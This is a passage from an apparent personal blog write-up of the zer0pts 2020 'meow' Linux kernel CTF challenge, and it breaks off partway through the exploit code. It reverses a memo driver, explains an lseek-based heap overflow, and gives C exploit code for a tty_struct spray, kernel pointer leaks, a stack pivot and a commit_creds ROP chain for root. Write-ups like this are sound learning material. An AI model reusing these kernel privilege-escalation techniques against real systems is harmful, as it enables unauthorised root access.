<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Meow Meow zeropts 2020
        
    </title><meta content="Meow Meow zeropts 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/meow/&t=Meow Meow zeropts 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Meow Meow zeropts 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2021-03-04</time></div></div><section class=body><p>I've been trying to learn some Linux Kernel Exploitation lately and stumbled over this simple yet beautiful challenge from zeropts 2020.<h1 id=tl-dr>tl;dr</h1><ul><li>Use the Kernel Heap overflow to Leak kernel pointers from <code>pty structure</code>.<li>Use the Kernel Heap overflow to write to the same kernel pointer <code>ptx_unix98_ops</code> from <code>pty structure</code>.<li>Pivot stack to heap using <code>ioctl</code> and a suitable gadget.<li>Classical <code>commit_creds(prepare_kernel_cred(0))</code> payload on the kernel heap to get root.</ul><h1 id=setting-up-the-debug-environment>Setting up the Debug Environment</h1><ul><li>Unpack the <code>rootfs.cpio</code> with</ul><pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>mkdir</span><span> rootfs </span><span style=color:#f29668>&& </span><span style=color:#f07178>cd</span><span> rootfs
</span><span style=color:#ffb454>sudo</span><span> su
</span><span style=color:#ffb454>cat</span><span> ../rootfs.cpio </span><span style=color:#f29668>| </span><span style=color:#ffb454>cpio</span><span style=color:#f29718> --extract
</span></code></pre><ul><li>Edit the <code>init</code> script , comment out the <code>echo 1</code> happening on <code>kptr_restrict</code> and <code>dmesg_restrict</code>.<li>Add the <code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code> to get root for debugging.<li>Disable <code>kaslr</code> in the <code>runner</code> script.</ul><h1 id=reversing>Reversing</h1><p>Let's see what each of the module's functionalities does.<h2 id=module-open>Module_Open</h2><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>static int </span><span style=color:#ffb454>mod_open</span><span>(</span><span style=color:#ff7733>struct</span><span> inode </span><span style=color:#f29668>*</span><span style=color:#f29718>inode</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>struct</span><span> file </span><span style=color:#f29668>*</span><span style=color:#f29718>file</span><span>)
</span><span>{
</span><span>  </span><span style=color:#ff7733>if </span><span>(memo </span><span style=color:#f29668>== </span><span style=color:#f29718>NULL</span><span>) {
</span><span>    memo </span><span style=color:#f29668>= </span><span style=color:#ffb454>kmalloc</span><span>(MAX_SIZE</span><span style=color:#bfbab0cc>,</span><span> GFP_KERNEL)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>memset</span><span>(memo</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> MAX_SIZE)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Allocates a chunk of <code>0x400</code> bytes to the <code>memo</code> if it is found null. Hence, only one allocation happens in the entire module's operations.<h2 id=module-read>Module_read</h2><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span style=color:#ff7733>static </span><span style=font-style:italic;color:#39bae6>ssize_t </span><span style=color:#ffb454>mod_read</span><span>(</span><span style=color:#ff7733>struct</span><span> file </span><span style=color:#f29668>*</span><span style=color:#f29718>filp</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>char</span><span> __user </span><span style=color:#f29668>*</span><span style=color:#f29718>buf</span><span style=color:#bfbab0cc>, </span><span style=font-style:italic;color:#39bae6>size_t </span><span style=color:#f29718>count</span><span style=color:#bfbab0cc>,</span><span> loff_t </span><span style=color:#f29668>*</span><span style=color:#f29718>f_pos</span><span>)
</span><span>{ 
</span><span>  </span><span style=color:#ff7733>if </span><span>(filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>< </span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>>=</span><span> MAX_SIZE) </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(count </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>) </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(count </span><span style=color:#f29668>></span><span> MAX_SIZE) count </span><span style=color:#f29668>=</span><span> MAX_SIZE </span><span style=color:#f29668>- *</span><span>f_pos</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>copy_to_user</span><span>(buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>memo[filp</span><span style=color:#f29668>-></span><span>f_pos]</span><span style=color:#bfbab0cc>,</span><span> count)) </span><span style=color:#ff7733>return </span><span style=color:#f29668>-</span><span>EFAULT</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f29668>*</span><span>f_pos </span><span style=color:#f29668>+=</span><span> count</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return</span><span> count</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span></code></pre><ul><li>Checks if the <code>f_pos</code> if less than 0 or greater than 0x400.<li>Also checks of count is less than 0<li>If count is found to be greater than 0x400, updates count to <code>0x400- *f_pos</code>.<li>Finally, <code>copy_to_user</code> happens of max count 0x400 into the userspace buffer from the memo.<li>File position is advanced by count bytes.</ul><h2 id=module-write>Module_write</h2><p>Pretty much the same as <code>module_read</code> except that it calls <code>copy_from_user</code> of 0x400 bytes. [again , no overflow apparently :(].<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>static </span><span style=font-style:italic;color:#39bae6>ssize_t </span><span style=color:#ffb454>mod_write</span><span>(</span><span style=color:#ff7733>struct</span><span> file </span><span style=color:#f29668>*</span><span style=color:#f29718>filp</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>const char</span><span> __user </span><span style=color:#f29668>*</span><span style=color:#f29718>buf</span><span style=color:#bfbab0cc>, </span><span style=font-style:italic;color:#39bae6>size_t </span><span style=color:#f29718>count</span><span style=color:#bfbab0cc>,</span><span> loff_t </span><span style=color:#f29668>*</span><span style=color:#f29718>f_pos</span><span>)
</span><span>{
</span><span>  </span><span style=color:#ff7733>if </span><span>(filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>< </span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>>=</span><span> MAX_SIZE) </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(count </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>) </span><span style=color:#ff7733>return </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(count </span><span style=color:#f29668>></span><span> MAX_SIZE) count </span><span style=color:#f29668>=</span><span> MAX_SIZE </span><span style=color:#f29668>- *</span><span>f_pos</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#ffb454>copy_from_user</span><span>(</span><span style=color:#f29668>&</span><span>memo[filp</span><span style=color:#f29668>-></span><span>f_pos]</span><span style=color:#bfbab0cc>,</span><span> buf</span><span style=color:#bfbab0cc>,</span><span> count)) </span><span style=color:#ff7733>return </span><span style=color:#f29668>-</span><span>EFAULT</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f29668>*</span><span>f_pos </span><span style=color:#f29668>+=</span><span> count</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return</span><span> count</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><h2 id=mod-llseek>mod_llseek</h2><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>static</span><span> loff_t </span><span style=color:#ffb454>mod_llseek</span><span>(</span><span style=color:#ff7733>struct</span><span> file </span><span style=color:#f29668>*</span><span style=color:#f29718>filp</span><span style=color:#bfbab0cc>,</span><span> loff_t </span><span style=color:#f29718>offset</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>int </span><span style=color:#f29718>whence</span><span>)
</span><span>{
</span><span>  loff_t newpos</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>switch</span><span>(whence) {
</span><span>  </span><span style=color:#ff7733>case</span><span> SEEK_SET</span><span style=color:#bfbab0cc>:
</span><span>    newpos </span><span style=color:#f29668>=</span><span> offset</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>case</span><span> SEEK_CUR</span><span style=color:#bfbab0cc>:
</span><span>    newpos </span><span style=color:#f29668>=</span><span> filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>+</span><span> offset</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>case</span><span> SEEK_END</span><span style=color:#bfbab0cc>:
</span><span>    newpos </span><span style=color:#f29668>= </span><span style=color:#f07178>strlen</span><span>(memo) </span><span style=color:#f29668>+</span><span> offset</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>default</span><span style=color:#bfbab0cc>:
</span><span>    </span><span style=color:#ff7733>return </span><span style=color:#f29668>-</span><span>EINVAL</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>if </span><span>(newpos </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>) </span><span style=color:#ff7733>return </span><span style=color:#f29668>-</span><span>EINVAL</span><span style=color:#bfbab0cc>;
</span><span>  filp</span><span style=color:#f29668>-></span><span>f_pos </span><span style=color:#f29668>=</span><span> newpos</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return</span><span> newpos</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><ul><li>Lets us <code>lseek</code> to the offset in our <code>memo</code>.</ul><h1 id=so-where-is-the-bug>So where is the bug??</h1><p>Individually , these functions are safe. But, if we combine the <code>llseek</code> and <code>read</code>, <code>write</code>, we leverage a sweet heap overflow. As you can see, the <code>mod_read</code> and <code>mod_write</code> don't have any checks for out of bounds <code>lseek</code>, hence , what we can do is, seek to the end of the memo and read or write 0x400 bytes.<h1 id=exploitation>Exploitation</h1><p>The idea here is, to have a kernel structure getting allocated just after our memo, so that we can read and write to it. Since, our <code>memo</code> is of size <code>0x400</code> , it will be allocated from the <code>kmalloc-1024</code> pool, and one super famous kernel structure which is also allocated from the <code>kmalloc-1024</code> pool is the good old <code>tty_struct</code>.<p>So, now the plan is -<ul><li>Spray <code>kmalloc-1024</code> and get a tty structure opened near our memo.<li><code>lseek</code> and <code>read</code> from the <code>tty_struct</code>. Leak heap and kernel function pointer.<li>Similar, write to the same function pointer, the address of heap which has the gadget to pivot stack to heap.<li>Calling <code>ioctl</code> triggers our <code>ptx_unix98_ops</code> function pointer giving us rip control to pivot stack to rop on heap.</ul><p>Let's script the Leak part.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>#define </span><span style=color:#59c2ff>_GNU_SOURCE
</span><span>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdio.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTunistd.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/types.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/stat.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTfcntl.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTerrno.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdlib.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/msg.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/ioctl.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/mman.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTsys/syscall.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstring.h>
</span><span style=color:#ff7733>#include </span><span style=color:#c2d94c>&LTstdlib.h>
</span><span>
</span><span style=color:#ff7733>#define </span><span style=color:#59c2ff>INVALID </span><span style=color:#f29668>-</span><span style=color:#f29718>1
</span><span>
</span><span style=color:#ff7733>int</span><span> ptmx</span><span style=color:#bfbab0cc>;
</span><span style=color:#ff7733>unsigned long</span><span> user_cs</span><span style=color:#bfbab0cc>,</span><span>user_sp</span><span style=color:#bfbab0cc>,</span><span>user_ss</span><span style=color:#bfbab0cc>,</span><span>user_rflags</span><span style=color:#bfbab0cc>,</span><span>fd</span><span style=color:#bfbab0cc>;
</span><span style=color:#ff7733>unsigned long</span><span> kbase</span><span style=color:#bfbab0cc>,</span><span>kheap</span><span style=color:#bfbab0cc>;
</span><span style=color:#ff7733>unsigned long</span><span> leak_buf[</span><span style=color:#f29718>0x400</span><span style=color:#f29668>/</span><span style=color:#f29718>8</span><span>]</span><span style=color:#bfbab0cc>;
</span><span style=color:#ff7733>unsigned long</span><span> push_r12_pop_rsp</span><span style=color:#bfbab0cc>;
</span><span style=color:#ff7733>unsigned long</span><span> pop_rdi</span><span style=color:#bfbab0cc>,</span><span>prepare_kernel_cred</span><span style=color:#bfbab0cc>,</span><span>commit_creds</span><span style=color:#bfbab0cc>,</span><span>pop_rcx</span><span style=color:#bfbab0cc>,</span><span>mov_rdi_rax</span><span style=color:#bfbab0cc>,</span><span>kpti_trampoline</span><span style=color:#bfbab0cc>;
</span><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>save_state</span><span>(){
</span><span>    </span><span style=color:#ff7733>__asm__</span><span>(</span><span style=color:#c2d94c>".intel_syntax noprefix;"
</span><span>            </span><span style=color:#c2d94c>"mov user_cs,cs;"
</span><span>            </span><span style=color:#c2d94c>"mov user_ss,ss;"
</span><span>            </span><span style=color:#c2d94c>"mov user_sp,rsp;"
</span><span>            </span><span style=color:#c2d94c>"pushf;"
</span><span>            </span><span style=color:#c2d94c>"pop user_rflags;"
</span><span>            </span><span style=color:#c2d94c>".att_syntax;"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[+] Saved user state!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>}
</span><span>
</span><span style=color:#ff7733>void </span><span style=color:#ffb454>Open_and_spray</span><span>(){
</span><span>    </span><span style=color:#ff7733>for</span><span>(</span><span style=color:#ff7733>int</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span>i</span><span style=color:#f29668><</span><span style=color:#f29718>10</span><span style=color:#bfbab0cc>;</span><span>i</span><span style=color:#f29668>++</span><span>){
</span><span>        ptmx </span><span style=color:#f29668>= </span><span style=color:#ffb454>open</span><span>(</span><span style=color:#c2d94c>"/dev/ptmx"</span><span style=color:#bfbab0cc>,</span><span>O_RDWR </span><span style=color:#f29668>|</span><span> O_NOCTTY)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ff7733>if</span><span>(ptmx </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>){
</span><span>            </span><span style=color:#f07178>perror</span><span>(</span><span style=color:#c2d94c>"[-] Failed to open ptmx"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>            </span><span style=color:#f07178>exit</span><span>(INVALID)</span><span style=color:#bfbab0cc>;
</span><span>        }
</span><span>    }
</span><span>    fd </span><span style=color:#f29668>= </span><span style=color:#ffb454>open</span><span>(</span><span style=color:#c2d94c>"/dev/memo"</span><span style=color:#bfbab0cc>,</span><span>O_RDWR)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if</span><span>(fd </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>){
</span><span>        </span><span style=color:#f07178>perror</span><span>(</span><span style=color:#c2d94c>"[-] Err in memo"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>char</span><span> buf[</span><span style=color:#f29718>0x400</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>memset</span><span>(buf</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x61</span><span style=color:#bfbab0cc>,</span><span style=color:#ff7733>sizeof</span><span>(buf))</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>write</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>buf</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x400</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[+] Opened memo!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    ptmx </span><span style=color:#f29668>= </span><span style=color:#ffb454>open</span><span>(</span><span style=color:#c2d94c>"/dev/ptmx"</span><span style=color:#bfbab0cc>,</span><span>O_RDWR </span><span style=color:#f29668>|</span><span> O_NOCTTY)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if</span><span>(ptmx </span><span style=color:#f29668>< </span><span style=color:#f29718>0</span><span>){
</span><span>        </span><span style=color:#f07178>perror</span><span>(</span><span style=color:#c2d94c>"[-] Failed to open ptmx"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>exit</span><span>(INVALID)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>}
</span></code></pre><p>As you can see, initially, we spray the <code>kmalloc-512</code> by opening <code>/dev/ptmx</code> which internally allocates <code>alloc_tty</code> structure via <code>kmalloc-1024</code> pool. So, when we open <code>memo</code> and then allocate another <code>ptmx</code>, we get contiguous allocation of <code>memo</code> followed by the <code>tty_struct</code>.<p>Now, we can safely get our leaks.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>get_leaks</span><span>(){
</span><span>    </span><span style=color:#ffb454>lseek</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x100</span><span style=color:#bfbab0cc>,</span><span>SEEK_SET)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(fd</span><span style=color:#bfbab0cc>,</span><span>leak_buf</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x400</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>for</span><span>(</span><span style=color:#ff7733>int</span><span> i</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span>i</span><span style=color:#f29668><</span><span style=color:#f29718>0x400</span><span style=color:#f29668>/</span><span style=color:#f29718>8</span><span style=color:#bfbab0cc>;</span><span>i</span><span style=color:#f29668>++</span><span>){
</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[*] leak_buf[</span><span style=color:#f29718>%d</span><span style=color:#c2d94c>] -> 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>i</span><span style=color:#bfbab0cc>,</span><span>leak_buf[i])</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    kbase </span><span style=color:#f29668>=</span><span> leak_buf[</span><span style=color:#f29718>99</span><span>] </span><span style=color:#f29668>- </span><span style=color:#f29718>0xe65900</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//ptx_unix98_ops
</span><span>    kheap </span><span style=color:#f29668>=</span><span> leak_buf[</span><span style=color:#f29718>103</span><span>] </span><span style=color:#f29668>- </span><span style=color:#f29718>0x438</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] kbase = 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>kbase)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] kheap = 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>kheap)</span><span style=color:#bfbab0cc>;
</span><span>    push_r12_pop_rsp </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x94d4e3</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>; 
</span><span>    pop_rdi </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1268</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    pop_rcx </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x4c852</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    prepare_kernel_cred </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x7bb50</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    mov_rdi_rax </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x19dcb</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    commit_creds </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x7b8b0</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    kpti_trampoline </span><span style=color:#f29668>=</span><span> kbase </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xa00a45</span><span style=color:#ff7733>L</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>?</span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"[+] push_r12_pop_rsp = 0x</span><span style=color:#f29718>%lx</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>push_r12_pop_rsp)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>You will soon know why I have used gadgets like <code>push_r12_pop_rsp</code> and <code>pop_rcx</code>. (rest everything is required for a standard cc(pkc(0)))<h1 id=rop-on-heap>ROP on Heap</h1><p>Now that we have the necessary leaks, we can now go ahead and overwrite our <code>ptx_unix98_ops</code> with a fake function pointer (our pivot gadget on heap).<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>write_rop</span><span>(){
</span><span>    </span><span style=font-style:italic;color:#5c6773>//overwrite the same ptx_unix98_ops with address of heap rop chain
</span><span>    leak_buf[</span><span style=color:#f29718>99</span><span>] </span><span style=color:#f29668>=</span><span> kheap </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x120</span><span style=color:#bfbab0cc>;
</span><span>    leak_buf[</span><span style=color:#f29718>16</span><span>] </span><span style=color:#f29668>=</span><span> push_r12_pop_rsp</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>We use the previous buffer into which we read our leaks. We see that <code>ptx_unix98_ops</code> is at <code>99th</code> offset and thus we overwrite it with our <code>memo+0x120</code>. We also populate our <code>memo+0x120</code> which is at offset <code>16th</code> with our <code>pivot gadget</code>.<p>But wait , so how does that pivot actually happen. The reason is, we are calling <code>ioctl</code> on the opened <code>ptmx</code> , which will internally invoke the <code>ptx_unix98_ops</code> function pointer. So, how does this work? For that , we should closely check the arguments of the <code>ioctl</code> userspace call.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>int </span><span style=color:#ffb454>ioctl</span><span>(</span><span style=color:#ff7733>int </span><span style=color:#f29718>fd</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>int </span><span style=color:#f29718>request</span><span style=color:#bfbab0cc>, </span><span style=color:#ff7733>char</span><span style=color:#f29668>* </span><span style=color:#f29718>cmd</span><span>)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>Since, the first two arguments are <code>int</code>, they're not of much use, but the third argument is a <code>char *</code>, which means its a pointer and we fully control it. So now, we should ideally be searching for <code>push rdx ; pop rsp</code> gadgets right? Well, what I observed during debugging is that such <code>push rdx</code> gadgets are dereferencing registers which are not pointers and also not in our control. Hence , I had to now see which all registers were set to our heap pointer which we pass as argument.<p>After some debugging , I found that <code>r12</code>, <code>rdx</code> and <code>rcx</code> were set to our heap pointer. Hence , I used the <code>push r12</code> gadget which did not compromise with the control flow.<p>After that, we can nicely pivot to heap and execute our rop chain.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>write_rop</span><span>(){
</span><span>    </span><span style=font-style:italic;color:#5c6773>//overwrite the same ptx_unix98_ops with address of heap rop chain
</span><span>    leak_buf[</span><span style=color:#f29718>99</span><span>] </span><span style=color:#f29668>=</span><span> kheap </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x120</span><span style=color:#bfbab0cc>;
</span><span>    leak_buf[</span><span style=color:#f29718>16</span><span>] </span><span style=color:#f29668>=</span><span> push_r12_pop_rsp</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[+] Writing ROP now!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=font-style:italic;color:#5c6773>//building rop now
</span><span>    </span><span style=color:#ff7733>unsigned long </span><span style=color:#f29668>*</span><span>rop </span><span style=color:#f29668>= &</span><span>leak_buf[</span><span style=color:#f29718>0</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> pop_rdi</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ = </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> prepare_kernel_cred</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> pop_rcx</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ = </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> mov_rdi_rax</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> commit_creds</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ =</span><span> kpti_trampoline</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#f29668>*</span><span>rop</span><span style=color:#f29668>++ = </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>//rdi
